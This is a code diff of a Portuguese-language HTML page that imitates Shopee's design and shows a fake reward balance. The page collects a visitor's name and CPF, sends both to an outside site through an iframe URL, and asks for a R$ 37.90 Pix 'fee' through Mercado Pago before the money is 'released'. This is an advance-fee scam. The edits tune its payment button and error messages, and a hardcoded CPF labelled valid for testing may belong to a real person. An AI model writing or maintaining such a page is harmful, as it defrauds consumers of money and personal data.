@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RESGATE ATUALIZADO 5.0</title> 
+    <title>SISTEMA ATUALIZADO (RAILWAY)</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
     <style>
-        /* CSS MANTIDO IGUAL AO SEU DESIGN ORIGINAL DA SACOLA */
+        /* ESTILOS ORIGINAIS MANTIDOS */
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         body { font-family: 'Roboto', sans-serif; background: #f5f5f5; margin: 0; padding: 0; color: #333; min-height: 100vh; overflow-x: hidden; }
         .hidden { display: none !important; }
@@ -18,7 +18,10 @@
         .option-btn { border: 1px solid #f0f0f0; background: #f9f9f9; padding: 12px 0; border-radius: 8px; text-align: center; font-weight: 700; flex: 1; color: #555; transition: 0.2s; }
         .big-option { width: 100%; padding: 20px 0; font-size: 26px; font-weight: 900; border: 1px solid #f0f0f0; border-radius: 8px; text-align: center; background: #f9f9f9; cursor: pointer; color: #333; }
         .selected { border: 2px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; }
-        .btn-main { background: #ee4d2d; color: white; width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: 800; text-transform: uppercase; cursor: pointer; transition: 0.2s; }
+        
+        /* BOTÃO AZUL PARA PROVAR ATUALIZAÇÃO */
+        .btn-main { background: #0044ff; color: white; width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 16px; font-weight: 800; text-transform: uppercase; cursor: pointer; transition: 0.2s; }
+        
         .btn-disabled { background: #e0e0e0; color: #aaa; cursor: not-allowed; }
         .shopee-footer { display: flex; align-items: center; justify-content: space-between; padding-top: 5px; }
         .shopee-desc h4 { margin: 0 0 4px 0; font-size: 14px; font-weight: 800; }
@@ -82,7 +85,7 @@
     </div>
     <div id="screen-vsl" class="vsl-container hidden">
         <iframe class="vsl-frame" src="https://recuperabonushopp.com/elementor-1623"></iframe>
-        <div class="vsl-footer-btn"><button id="btn-final" class="btn-main" onclick="gerarPixAPI()">PAGAR TAXA E RECEBER SALDO</button></div>
+        <div class="vsl-footer-btn"><button id="btn-final" class="btn-main" onclick="gerarPixAPI()">PAGAR TAXA (R$ 37,90)</button></div>
     </div>
     <div id="modal-qr" class="modal-overlay hidden" style="background:rgba(0,0,0,0.85); align-items:center;">
         <div class="qr-box">
@@ -95,8 +98,7 @@
         </div>
     </div>
     <script>
-        const API = ""; 
-        function logDebug(m) { console.log(m); }
+        const API = ""; // Usa o servidor local do Railway
         function anim(id, val) { let cur=0, el=document.getElementById(id), step=val/40, t=setInterval(()=>{ cur+=step; if(cur>=val){ el.innerText=val.toLocaleString('pt-BR',{minimumFractionDigits:2}); clearInterval(t); }else el.innerText=cur.toLocaleString('pt-BR',{minimumFractionDigits:2}); },30); }
         window.onload = () => { anim('balance', 1489.38); anim('points', 42583.05); };
         let sel=false;
@@ -116,14 +118,26 @@
             document.querySelector('.vsl-frame').src = `https://recuperabonushopp.com/elementor-1623?nome=${encodeURIComponent(n)}&cpf=${c}`;
             document.getElementById('screen-confirm').classList.add('hidden'); document.getElementById('screen-vsl').classList.remove('hidden');
         }
+
         async function gerarPixAPI() {
             let btn = document.getElementById('btn-final');
             let n = document.getElementById('input-nome').value;
-            let c = document.getElementById('input-chave').value.replace(/\D/g,'') || "12345678909";
-            btn.disabled = true; btn.innerText = "GERANDO...";
+            // Usa o CPF digitado. Se não tiver, usa um genérico para não travar
+            let c = document.getElementById('input-chave').value.replace(/\D/g,'');
+            if(c.length < 11) c = "06649733054"; // CPF Válido para teste
+            
+            btn.disabled = true; btn.innerText = "CONECTANDO...";
+            
             try {
-                let res = await fetch(`${API}/pix`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ name: n, cpf: c, amount: 37.90 }) });
+                // Tenta conectar no servidor
+                let res = await fetch(`${API}/pix`, { 
+                    method:'POST', 
+                    headers:{'Content-Type':'application/json'}, 
+                    body: JSON.stringify({ name: n, cpf: c, amount: 37.90 }) 
+                });
+                
                 let json = await res.json();
+                
                 if(res.ok && json.point_of_interaction) {
                     let img = json.point_of_interaction.transaction_data.qr_code_base64;
                     let code = json.point_of_interaction.transaction_data.qr_code;
@@ -131,10 +145,13 @@
                     document.getElementById('pix-copy').value = code;
                     document.getElementById('modal-qr').classList.remove('hidden');
                 } else {
-                    alert("Erro MP: " + (json.detalhes?.message || json.error || "Recusado"));
+                    // MOSTRA O ERRO NA TELA
+                    alert("ERRO MERCADO PAGO:\n" + JSON.stringify(json.detalhes || json.error || json, null, 2));
                 }
-            } catch(e) { alert("Erro de conexão: " + e.message); }
-            btn.disabled = false; btn.innerText = "PAGAR TAXA E RECEBER SALDO";
+            } catch(e) { 
+                alert("ERRO DE CONEXÃO:\n" + e.message); 
+            }
+            btn.disabled = false; btn.innerText = "PAGAR TAXA (R$ 37,90)";
         }
         function copyCode() { document.getElementById('pix-copy').select(); document.execCommand('copy'); alert("Copiado!"); }
     </script>
